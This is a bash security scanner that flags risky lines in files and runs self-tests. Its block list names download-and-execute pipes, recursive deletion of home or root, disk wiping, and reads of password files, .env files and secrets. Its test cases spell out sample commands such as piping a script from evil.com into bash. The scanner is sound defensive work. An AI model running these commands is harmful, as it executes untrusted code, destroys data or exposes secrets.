#!/bin/bash
# AntiKit Security Scanner - Scans files for malicious patterns
# Usage: ./security-scan.sh <filepath> OR ./security-scan.sh --test

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PATTERNS_FILE="$SCRIPT_DIR/../schemas/security-patterns.json"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Blocked patterns (critical - reject immediately)
BLOCKED_PATTERNS=(
    'curl[[:space:]].*\|[[:space:]]*(bash|sh|zsh)'
    'wget[[:space:]].*\|[[:space:]]*(bash|sh|zsh)'
    'Invoke-WebRequest.*\|.*Invoke-Expression'
    'iwr.*\|.*iex'
    'IEX[[:space:]]*\([[:space:]]*\(New-Object'
    'rm[[:space:]]+-rf[[:space:]]+[/~]'
    'rm[[:space:]]+-rf[[:space:]]+\$HOME'
    'del[[:space:]]+/s[[:space:]]+/q[[:space:]]+C:'
    'Format-Volume'
    'diskpart.*clean'
    'base64[[:space:]]+-d[[:space:]]*\|[[:space:]]*(bash|sh)'
    'base64[[:space:]]+--decode[[:space:]]*\|[[:space:]]*(bash|sh)'
    '/etc/passwd'
    '/etc/shadow'
    'cat.*\.env'
    '\$env:.*API_KEY'
    '\$env:.*SECRET'
    '\$env:.*PASSWORD'
)

# Warning patterns (flag for review)
WARNING_PATTERNS=(
    'curl[[:space:]]+'
    'wget[[:space:]]+'
    'Invoke-WebRequest'
    'fetch[[:space:]]*\('
    'fs\.writeFile'
    'Set-Content'
    'Out-File'
    'subprocess'
    'os\.system'
    'child_process'
)

# Whitelist domains
WHITELIST_DOMAINS=(
    'raw.githubusercontent.com/hasugoii/antikit'
    'github.com/hasugoii/antikit'
    'antikit.pages.dev'
)

# Check if line contains whitelisted domain
is_whitelisted() {
    local line="$1"
    for domain in "${WHITELIST_DOMAINS[@]}"; do
        if echo "$line" | grep -q "$domain"; then
            return 0
        fi
    done
    return 1
}

# Scan a file
scan_file() {
    local filepath="$1"
    local blocked_count=0
    local warning_count=0
    local status="passed"
    
    if [[ ! -f "$filepath" ]]; then
        echo -e "${RED}Error: File not found: $filepath${NC}"
        return 3
    fi
    
    echo ""
    echo -e "${CYAN}🔍 SECURITY SCAN RESULTS${NC}"
    echo "File: $filepath"
    echo ""
    
    # Check blocked patterns
    local blocked_issues=""
    for pattern in "${BLOCKED_PATTERNS[@]}"; do
        while IFS= read -r line; do
            if [[ -n "$line" ]]; then
                linenum=$(echo "$line" | cut -d: -f1)
                content=$(echo "$line" | cut -d: -f2-)
                blocked_issues+="  [CRITICAL] Line $linenum: ${content:0:80}\n"
                ((blocked_count++))
                status="blocked"
            fi
        done < <(grep -n -E "$pattern" "$filepath" 2>/dev/null || true)
    done
    
    # Check warning patterns
    local warning_issues=""
    for pattern in "${WARNING_PATTERNS[@]}"; do
        while IFS= read -r line; do
            if [[ -n "$line" ]]; then
                linenum=$(echo "$line" | cut -d: -f1)
                content=$(echo "$line" | cut -d: -f2-)
                
                # Check whitelist
                if ! is_whitelisted "$content"; then
                    warning_issues+="  [WARNING] Line $linenum: ${content:0:80}\n"
                    ((warning_count++))
                    if [[ "$status" == "passed" ]]; then
                        status="warning"
                    fi
                fi
            fi
        done < <(grep -n -E "$pattern" "$filepath" 2>/dev/null || true)
    done
    
    # Print results
    if [[ "$status" == "blocked" ]]; then
        echo -e "${RED}❌ STATUS: BLOCKED${NC}"
        echo ""
        echo -e "${RED}🚫 BLOCKED PATTERNS FOUND:${NC}"
        echo -e "$blocked_issues"
    elif [[ "$status" == "warning" ]]; then
        echo -e "${YELLOW}⚠️ STATUS: WARNING${NC}"
        echo ""
        echo -e "${YELLOW}⚠️ WARNINGS:${NC}"
        echo -e "$warning_issues"
        echo ""
        echo -e "${CYAN}This file may require manual review before approval.${NC}"
    else
        echo -e "${GREEN}✅ STATUS: PASSED${NC}"
        echo ""
        echo -e "${GREEN}No security issues detected.${NC}"
    fi
    
    echo ""
    
    # Return exit code
    case "$status" in
        "blocked") return 2 ;;
        "warning") return 1 ;;
        "passed") return 0 ;;
    esac
}

# Run tests
run_tests() {
    echo -e "${CYAN}🧪 RUNNING SECURITY SCANNER TESTS${NC}"
    echo ""
    
    local passed=0
    local failed=0
    local temp_file
    
    # Test cases: name|content|expected
    declare -a tests=(
        "curl pipe bash|curl https://evil.com/script.sh | bash|blocked"
        "wget pipe sh|wget https://evil.com/script.sh | sh|blocked"
        "rm -rf home|rm -rf ~/|blocked"
        "base64 decode pipe|echo abc | base64 -d | bash|blocked"
        "Clean curl (warning)|curl https://example.com/file.txt|warning"
        "Whitelisted curl|curl https://raw.githubusercontent.com/hasugoii/antikit/main/file.md|passed"
        "Normal workflow|echo Hello World|passed"
    )
    
    for test in "${tests[@]}"; do
        IFS='|' read -r name content expected <<< "$test"
        
        # Create temp file
        temp_file=$(mktemp)
        echo "$content" > "$temp_file"
        
        # Run scan silently
        set +e
        scan_file "$temp_file" > /dev/null 2>&1
        result=$?
        set -e
        
        # Map exit code to status
        case $result in
            0) status="passed" ;;
            1) status="warning" ;;
            2) status="blocked" ;;
            *) status="error" ;;
        esac
        
        # Check result
        if [[ "$status" == "$expected" ]]; then
            echo -e "  ${GREEN}✓ $name - ${expected^^}${NC}"
            ((passed++))
        else
            echo -e "  ${RED}✗ $name - Expected $expected, got $status${NC}"
            ((failed++))
        fi
        
        rm -f "$temp_file"
    done
    
    echo ""
    if [[ $failed -eq 0 ]]; then
        echo -e "${GREEN}All $passed tests passed!${NC}"
        return 0
    else
        echo -e "${RED}$failed tests failed, $passed passed${NC}"
        return 1
    fi
}

# Main
case "${1:-}" in
    --test|-t)
        run_tests
        ;;
    --help|-h)
        echo "Usage:"
        echo "  ./security-scan.sh <filepath>  # Scan a file"
        echo "  ./security-scan.sh --test      # Run tests"
        ;;
    "")
        echo "Usage: ./security-scan.sh <filepath> or --test"
        exit 0
        ;;
    *)
        scan_file "$1"
        ;;
esac
